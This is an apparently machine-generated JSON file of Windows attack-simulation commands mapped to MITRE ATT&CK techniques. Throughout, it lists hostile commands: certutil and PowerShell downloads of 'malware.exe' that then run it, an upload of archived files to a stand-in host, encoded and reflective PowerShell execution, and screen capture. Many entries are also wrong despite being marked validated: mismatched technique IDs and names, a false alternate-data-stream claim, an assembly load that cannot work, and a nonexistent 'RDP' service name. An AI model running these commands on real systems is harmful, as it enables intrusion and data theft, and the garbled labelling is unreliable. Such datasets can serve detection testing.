      "description": "Use wmic to gather system information",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "System information will be displayed in the command prompt",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:03.350107",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7ee19eb8-46fb-4463-839b-df0c268419f9",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "T1190 - Exploit Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://example.com/malicious.docx' -OutFile '%TEMP%\\malicious.docx'\"",
      "description": "Downloads a malicious document with macro code",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:03.849318",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "28984162-4ba8-48b9-8597-7fba619f369f",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "T1190 - Exploit Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path '%TEMP%\\malicious.docx' -DestinationPath '%TEMP%\\archive.zip' -Force\"",
      "description": "Archives the malicious document using Compress-Archive",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a zip archive in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:03.849318",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7c4f1277-1f93-4628-a07e-6870e122ff9b",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "T1190 - Exploit Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f 'http://example.com/malicious.docx' '%TEMP%\\malicious.docx'",
      "description": "Downloads a malicious document using certutil",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:03.849318",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "72ab3e06-76d1-4808-acfc-8f9a3fa67eb6",
      "ttp_id": "unknown",
      "technique_id": "T1566",
      "technique_name": "T1566 - Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Phishing Message')\"",
      "description": "Displays a phishing message to the user using PowerShell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A message box will pop up with a phishing message",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:04.333999",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e05853e3-a528-48e4-9448-717126182f73",
      "ttp_id": "unknown",
      "technique_id": "T1566",
      "technique_name": "T1566 - Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$wshell = New-Object -ComObject WScript.Shell; $wshell.Popup('Phishing Message', 0, 'Phishing', 64)\"",
      "description": "Displays a phishing message to the user using COM objects",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A message box will pop up with a phishing message",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:04.333999",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f25cc8ca-1df7-4f51-be01-f9156322b396",
      "ttp_id": "unknown",
      "technique_id": "T1566",
      "technique_name": "T1566 - Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$file = '%TEMP%\\phishing.doc'; Set-Content -Path $file -Value 'Phishing document'; Start-Process $file\"",
      "description": "Creates a phishing document and opens it",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A document will be created and opened",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:04.333999",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "33b37b53-b76c-44e9-8db9-7c5e160fa7dd",
      "ttp_id": "unknown",
      "technique_id": "T1005",
      "technique_name": "T1005 - Data from Local System",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-ChildItem -Path C:\\\\Users\\\\Public\\\\Documents -Filter *.txt\"",
      "description": "List all .txt files in the Public Documents folder",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists files in the specified directory",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:04.892250",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "225bd97b-27b7-4804-9df1-551240e33fda",
      "ttp_id": "unknown",
      "technique_id": "T1005",
      "technique_name": "T1005 - Data from Local System",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path C:\\\\Users\\\\Public\\\\Documents\\\\example.txt -DestinationPath C:\\\\Users\\\\Public\\\\Documents\\\\archive.zip -Force\"",
      "description": "Archive a file using Compress-Archive",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a zip archive of the specified file",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:04.892250",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4d25cde6-b88d-475c-a9c5-cf0c73a57a54",
      "ttp_id": "unknown",
      "technique_id": "T1005",
      "technique_name": "T1005 - Data from Local System",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c \"for /f \"tokens=*\" %f in ('dir /b C:\\\\Users\\\\Public\\\\Documents\\\\*.txt') do type %f >> C:\\\\Users\\\\Public\\\\Documents\\\\combined.txt\"",
      "description": "Combine the contents of all .txt files in the Public Documents folder into a single file",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a new file containing the combined contents of the specified files",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:04.892250",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "393cd8a2-70eb-4b63-96ff-234cef265538",
      "ttp_id": "unknown",
      "technique_id": "T1218",
      "technique_name": "T1218 - Signed Binary Proxy Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c \"C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe\" -app \"C:\\\\Users\\\\Public\\\\app.ini\"",
      "description": "Signed Binary Proxy Execution via Firefox",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The command will execute the firefox.exe binary with an alternate data stream, potentially disguising malicious activity as legitimate Firefox browser activity.",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:05.404892",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "84c5c49a-0cdc-476c-b932-8f41485fb4cf",
      "ttp_id": "unknown",
      "technique_id": "T1218",
      "technique_name": "T1218 - Signed Binary Proxy Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& 'C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe' -app 'C:\\\\Users\\\\Public\\\\app.ini'\"",
      "description": "Signed Binary Proxy Execution via PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The command will execute the firefox.exe binary with an alternate data stream via PowerShell, potentially evading detection.",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:05.404892",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "41471f4b-69c8-4155-94e0-f6d2c6957719",
      "ttp_id": "unknown",
      "technique_id": "T1218",
      "technique_name": "T1218 - Signed Binary Proxy Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c \"C:\\\\Windows\\\\System32\\\\cmd.exe\" /c \"C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe\" -app \"C:\\\\Users\\\\Public\\\\app.ini\"",
      "description": "Signed Binary Proxy Execution via Nested Command Prompt",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The command will execute the firefox.exe binary with an alternate data stream via a nested command prompt, potentially complicating detection and analysis.",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:05.404892",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9d1ff0ce-2338-4b7b-a90a-5d4def232935",
      "ttp_id": "unknown",
      "technique_id": "T1620",
      "technique_name": "T1620 - Reflective Code Loading",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('SGVsbG8gd29ybGQ=')); [System.Console]::WriteLine('Hello World');\"",
      "description": "Loads a .NET assembly using reflection and executes a benign payload",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command will print 'Hello World' to the console",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:06.018263",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3a750c44-da31-46f4-9bfa-71717e248467",
      "ttp_id": "unknown",
      "technique_id": "T1620",
      "technique_name": "T1620 - Reflective Code Loading",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.Net; [System.Net.WebClient]::DownloadString('file://%TEMP%/test.txt') | Invoke-Expression -ErrorAction SilentlyContinue; Remove-Item -Path '%TEMP%/test.txt' -Force -ErrorAction SilentlyContinue\"",
      "description": "Downloads a file from a local path and executes its contents using Invoke-Expression",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The command will download a file from the local temp directory and execute its contents, then attempt to clean up the file",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:06.018263",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "25559fba-4039-494b-998d-efe58be08f4f",
      "ttp_id": "unknown",
      "technique_id": "T1620",
      "technique_name": "T1620 - Reflective Code Loading",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('SGVsbG8gd29ybGQ=')); [System.Console]::WriteLine('Hello World'); [System.Threading.Thread]::Sleep(1000); [System.Diagnostics.Process]::Start('cmd.exe', '/c', 'echo Hello World > %TEMP%/test.txt') -ErrorAction SilentlyContinue; Remove-Item -Path '%TEMP%/test.txt' -Force -ErrorAction SilentlyContinue\"",
      "description": "Loads a .NET assembly using reflection, executes a benign payload, and creates a file using cmd.exe",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The command will print 'Hello World' to the console, create a file in the temp directory, wait for 1 second, and then attempt to clean up the file",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:06.018263",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c832b912-f16d-42a0-8eeb-0d51b389feeb",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "T1105 - Ingress Tool Transfer",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri http://example.com/malware.exe -OutFile %TEMP%\\malware.exe\"",
      "description": "Downloads malware using Invoke-WebRequest",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:06.819981",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "00afa77d-5d5a-4dd8-9eec-e3eb78544169",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "T1105 - Ingress Tool Transfer",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -urlcache http://example.com/malware.exe %TEMP%\\malware.exe",
      "description": "Downloads malware using certutil",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:06.819981",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "db0bf386-5212-467d-a2c4-35fcf2e1fba3",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "T1105 - Ingress Tool Transfer",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Net.WebClient]::DefaultWebProxy = $null; Invoke-WebRequest -Uri http://example.com/malware.exe -OutFile %TEMP%\\malware.exe\"",
      "description": "Downloads malware using Invoke-WebRequest with proxy bypass",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:06.819981",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9e69fdcc-8e51-4567-b896-3f5177fb6123",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "T1041 - Exfiltration Over Command and Control Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Convert]::ToBase64String([System.Text.Encoding]::UTF16LE.GetBytes('Get-ChildItem -Path C:\\\\\\\\temp\\\\\\\\ -File | ForEach-Object { $_.Name }'))\"",
      "description": "Exfiltration Over Command and Control Channel using PowerShell EncodedCommand",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Lists files in temp directory and exfiltrates the list over C2 channel",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:07.389633",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d399e98a-cc2c-4622-a79d-445065a45604",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "T1041 - Exfiltration Over Command and Control Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/malicious.exe %TEMP%\\\\\\malicious.exe && %TEMP%\\\\\\malicious.exe",
      "description": "Exfiltration Over Command and Control Channel using certutil",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads a malicious executable from a URL and executes it",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:07.390640",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "0e46ecc0-2343-4585-a96a-3e2cc98e16b3",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "T1041 - Exfiltration Over Command and Control Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path C:\\\\\\\\temp\\\\\\\\\\* -DestinationPath %TEMP%\\\\\\exfiltrated_data.zip -Force; Invoke-WebRequest -Uri http://example.com/upload -Method Post -InFile %TEMP%\\\\\\exfiltrated_data.zip\"",
      "description": "Exfiltration Over Command and Control Channel using PowerShell Compress-Archive and Invoke-WebRequest",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Compresses files in temp directory, then uploads the compressed archive to a URL over C2 channel",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:07.390640",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4937a09f-9557-448f-8003-f602cb0e6db0",
      "ttp_id": "unknown",
      "technique_id": "T1021",
      "technique_name": "T1021 - Remote Services",
      "tactic": "execution",
      "platform": "windows",
      "command": "net start RDP",
      "description": "Starts the Remote Desktop Services to allow remote connections",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Remote Desktop Services started successfully",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:07.940399",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6c7f3e61-3a53-4842-aa1c-d2914b426cb0",
      "ttp_id": "unknown",
      "technique_id": "T1021",
      "technique_name": "T1021 - Remote Services",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"&{Start-Service -Name RDP -Force}\"",
      "description": "Starts the Remote Desktop Services using PowerShell to allow remote connections",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Remote Desktop Services started successfully",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:07.940904",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3500f933-9912-4851-8e54-6af4536af555",
      "ttp_id": "unknown",
      "technique_id": "T1021",
      "technique_name": "T1021 - Remote Services",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc config rdpsvc start= auto & net start rdpsvc",
      "description": "Configures the Remote Desktop Services to start automatically and starts the service",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Remote Desktop Services configured to start automatically and started successfully",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:07.940904",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "80bee329-91a2-40c9-9083-adbf3ebe9089",
      "ttp_id": "unknown",
      "technique_id": "T1497",
      "technique_name": "T1497 - Virtualization/Sandbox Evasion",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Write-Host 'Virtualization/Sandbox Evasion Test'}\"",
      "description": "Basic test to detect virtualization/sandbox evasion using Write-Host",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Writes 'Virtualization/Sandbox Evasion Test' to the console",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:08.832813",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a07f8ef8-7f17-4e21-987b-062d386dd5ba",
      "ttp_id": "unknown",
      "technique_id": "T1497",
      "technique_name": "T1497 - Virtualization/Sandbox Evasion",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/malware.exe %TEMP%\\malware.exe && %TEMP%\\malware.exe",
      "description": "Intermediate test to detect virtualization/sandbox evasion by downloading and executing a file",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file from a URL and executes it",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:08.832813",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d9774a61-403f-4ef4-9ee9-fe59206d00b6",
      "ttp_id": "unknown",
      "technique_id": "T1497",
      "technique_name": "T1497 - Virtualization/Sandbox Evasion",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Start-Process -FilePath 'C:\\\\Windows\\\\System32\\\\cmd.exe' -ArgumentList '/c', 'whoami /priv'}\"",
      "description": "Advanced test to detect virtualization/sandbox evasion using Start-Process and whoami",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Runs the whoami command with the /priv option to display privileges",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:08.832813",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7a426b6a-3d45-441b-80f1-f5da793c7303",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path C:\\\\Users\\\\Public\\\\Documents\\\\* -DestinationPath %TEMP%\\\\exfiltrated.zip -Force\"",
      "description": "Exfiltrate files via compressed archive",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a zip archive of files in the public documents folder and saves it to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:20.065833",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3e3ee2b0-15dd-45e4-b30f-9aeb4cce6487",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path %TEMP%\\\\exfiltrated.txt -Value 'Test exfiltration data' -Force\"",
      "description": "Exfiltrate data via text file",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a text file in the temp directory containing test exfiltration data",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:20.065833",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "47d22d45-6769-4234-9141-a0c366715569",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -urlcache http://example.com/exfiltrated.txt %TEMP%\\\\exfiltrated.txt",
      "description": "Exfiltrate data via certutil",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file from a URL and saves it to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:20.065833",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "62599866-9545-476d-aaee-814c9a6fadcd",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path C:\\\\Users\\\\Public\\\\Documents\\\\* -DestinationPath C:\\\\Users\\\\Public\\\\Documents\\\\archive.zip -Force\"",
      "description": "Archive collected data using Compress-Archive cmdlet",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates an archive of all files in the Public Documents folder",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:20.542683",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "fe9a5bb5-49c9-4c1c-9705-7dd9291da7dd",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::CreateFromDirectory('C:\\\\Users\\\\Public\\\\Documents', 'C:\\\\Users\\\\Public\\\\Documents\\\\archive.zip')\"",
      "description": "Archive collected data using ZipFile class",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates an archive of all files in the Public Documents folder",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:20.542683",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2ac4e03f-f028-4fda-8226-dff0038cf5c6",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$files = Get-ChildItem -Path C:\\\\Users\\\\Public\\\\Documents; Compress-Archive -Path $files.FullName -DestinationPath C:\\\\Users\\\\Public\\\\Documents\\\\archive.zip -Force\"",
      "description": "Archive collected data using Get-ChildItem and Compress-Archive cmdlets",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates an archive of all files in the Public Documents folder",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:20.542683",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bc4d9551-9132-4fce-acdc-fe788193fa88",
      "ttp_id": "unknown",
      "technique_id": "T1069",
      "technique_name": "Account Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "net user",
      "description": "Basic Account Discovery using net user command",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists all user accounts on the system",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:20.970754",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d78e94d0-c3d9-4387-8cd7-8f7e35857d80",
      "ttp_id": "unknown",
      "technique_id": "T1069",
      "technique_name": "Account Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-LocalUser | Select-Object Name, Description\"",
      "description": "Intermediate Account Discovery using PowerShell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists all local user accounts with their names and descriptions",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:20.970754",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cd8c3731-24b7-459c-a091-434b5edf0490",
      "ttp_id": "unknown",
      "technique_id": "T1069",
      "technique_name": "Account Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Security.Principal.WindowsIdentity]::GetCurrent().Name\"",
      "description": "Advanced Account Discovery using PowerShell to get current user identity",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Gets the current user identity",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:20.970754",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bda95c1d-6019-4357-9eaf-a8ebe9984f8b",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Screen Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; $screenBounds = [Windows.Forms.SystemInformation]::VirtualScreen; $screenshot = New-Object Drawing.Bitmap $screenBounds.Width, $screenBounds.Height; $graph = [Drawing.Graphics]::FromImage($screenshot); $graph.CopyFromScreen($screenBounds.X, $screenBounds.Y, 0, 0, $screenBounds.Size); $screenshot.Save('%TEMP%\\screenshot.png', [Drawing.Imaging.ImageFormat]::Png)\"",
      "description": "Captures the screen and saves it as a PNG file in the temp directory",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A screenshot of the current screen is saved to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:21.728747",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4401f42e-caf5-44f6-a5bd-6fa75afe8548",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Screen Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[Reflection.Assembly]::LoadWithPartialName('System.Drawing'); $screenBounds = [Windows.Forms.SystemInformation]::VirtualScreen; $screenshot = New-Object Drawing.Bitmap $screenBounds.Width, $screenBounds.Height; $graph = [Drawing.Graphics]::FromImage($screenshot); $graph.CopyFromScreen($screenBounds.X, $screenBounds.Y, 0, 0, $screenBounds.Size); $screenshot.Save('%TEMP%\\screenshot2.png', [Drawing.Imaging.ImageFormat]::Png); Remove-Item '%TEMP%\\screenshot2.png' -ErrorAction SilentlyContinue\"",
      "description": "Captures the screen, saves it as a PNG file in the temp directory, and then attempts to delete the file",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A screenshot of the current screen is saved to the temp directory and then deleted",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:21.728747",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e42192b3-b571-4f3e-a1d2-9c51d694bcb1",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Screen Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$signature = @';[void][Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\");[void][Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");$screenBounds = [Windows.Forms.SystemInformation]::VirtualScreen;$screenshot = New-Object Drawing.Bitmap $screenBounds.Width, $screenBounds.Height;$graph = [Drawing.Graphics]::FromImage($screenshot);$graph.CopyFromScreen($screenBounds.X, $screenBounds.Y, 0, 0, $screenBounds.Size);$screenshot.Save(\"%TEMP%\\screenshot3.png\", [Drawing.Imaging.ImageFormat]::Png);\"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($signature); $encodedCommand = [Convert]::ToBase64String($bytes); powershell -EncodedCommand $encodedCommand\"",
      "description": "Captures the screen using an encoded command and saves it as a PNG file in the temp directory",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A screenshot of the current screen is saved to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:21.728747",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6eba6824-5a76-4f81-a793-a2741aa136b7",
      "ttp_id": "unknown",
      "technique_id": "T1566",
      "technique_name": "Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c start cmd.exe /k whoami",
      "description": "Spawn command shell via cmd to simulate phishing activity",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "New command shell window opens",
      "source": "langchain",
      "generated_at": "2025-12-21T17:40:22.717954",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
